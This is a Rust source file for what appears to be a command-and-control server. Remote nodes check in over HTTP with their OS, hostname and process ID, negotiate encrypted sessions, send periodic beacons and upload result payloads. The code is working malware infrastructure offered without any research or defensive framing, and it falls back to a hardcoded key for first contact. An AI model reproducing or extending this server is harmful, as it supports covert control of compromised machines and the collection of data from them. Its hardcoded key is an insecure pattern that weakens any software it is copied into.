use std::collections::HashMap;
use std::io::Read;
use std::sync::Mutex;

use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;

use glimmer::crypto::{self, SessionKey, StaticKeypair};
use glimmer::proto::{self, MsgType};

struct NodeState {
    session_key: SessionKey,
}

struct Server {
    nodes: Mutex<HashMap<String, NodeState>>,
    keypair: StaticKeypair,
    dev_key: SessionKey,
}

impl Server {
    fn new() -> Self {
        let keypair = StaticKeypair::generate();
        eprintln!(
            "[server] public key: {}",
            hex::encode(keypair.public_key_bytes())
        );
        Server {
            nodes: Mutex::new(HashMap::new()),
            keypair,
            dev_key: SessionKey::from_bytes(*b"dev-key-replace-with-ecdh-later!"),
        }
    }
}

fn main() {
    let addr = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "0.0.0.0:8080".into());

    let server = std::sync::Arc::new(Server::new());

    let listener = std::net::TcpListener::bind(&addr).unwrap();
    eprintln!("[server] listening on {}", addr);

    for stream in listener.incoming() {
        let stream = match stream {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[error] accept: {}", e);
                continue;
            }
        };

        let server = server.clone();
        std::thread::spawn(move || {
            if let Err(e) = handle_connection(stream, &server) {
                eprintln!("[error] connection: {}", e);
            }
        });
    }
}

fn handle_connection(
    mut stream: std::net::TcpStream,
    server: &Server,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut buf = vec![0u8; 65536];
    let n = stream.read(&mut buf)?;
    let raw = String::from_utf8_lossy(&buf[..n]);

    let body = match raw.find("\r\n\r\n") {
        Some(pos) => &raw[pos + 4..],
        None => return Err("no HTTP body".into()),
    };

    let decoded = BASE64.decode(body.trim())?;

    // Try existing node session keys first
    let mut decrypted = None;
    let mut matched_node: Option<String> = None;
    {
        let nodes = server.nodes.lock().unwrap();
        for (id, state) in nodes.iter() {
            if let Ok(plain) = state.session_key.decrypt(&decoded) {
                decrypted = Some(plain);
                matched_node = Some(id.clone());
                break;
            }
        }
    }

    // Fall back to dev key for initial checkins
    if decrypted.is_none() {
        if let Ok(plain) = server.dev_key.decrypt(&decoded) {
            decrypted = Some(plain);
        }
    }

    let plaintext = match decrypted {
        Some(p) => p,
        None => return Err("could not decrypt".into()),
    };

    let envelope = proto::unmarshal(&plaintext)?;
    let ts = chrono::NaiveDateTime::from_timestamp_opt(envelope.timestamp, 0)
        .map(|t| t.format("%H:%M:%S").to_string())
        .unwrap_or_else(|| "???".into());

    match envelope.msg_type {
        MsgType::Checkin => {
            if let Some(payload) = &envelope.payload {
                let checkin: proto::CheckinData = serde_json::from_slice(payload)?;

                // Derive session key from beacon's public key
                let session_key = server
                    .keypair
                    .derive_session_key(&checkin.pub_key)?;

                eprintln!(
                    "[checkin] {} node={} os={}/{} host={} pid={} [ECDH session established]",
                    ts,
                    envelope.node_id,
                    checkin.os,
                    checkin.arch,
                    checkin.host,
                    checkin.pid,
                );

                let mut nodes = server.nodes.lock().unwrap();
                nodes.insert(envelope.node_id.clone(), NodeState { session_key });

                // Send server's public key in the response so beacon
                // can derive the same session key
                let server_pub = server.keypair.public_key_bytes();
                let response_body = BASE64.encode(&server_pub);
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                    response_body.len(),
                    response_body
                );
                std::io::Write::write_all(&mut stream, response.as_bytes())?;
                return Ok(());
            }
        }
        MsgType::Beacon => {
            eprintln!("[beacon] {} node={}", ts, envelope.node_id);
        }
        MsgType::Result => {
            eprintln!(
                "[result] {} node={} payload={} bytes",
                ts,
                envelope.node_id,
                envelope.payload.as_ref().map(|p| p.len()).unwrap_or(0)
            );
        }
    }

    let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
    std::io::Write::write_all(&mut stream, response.as_bytes())?;

    Ok(())
}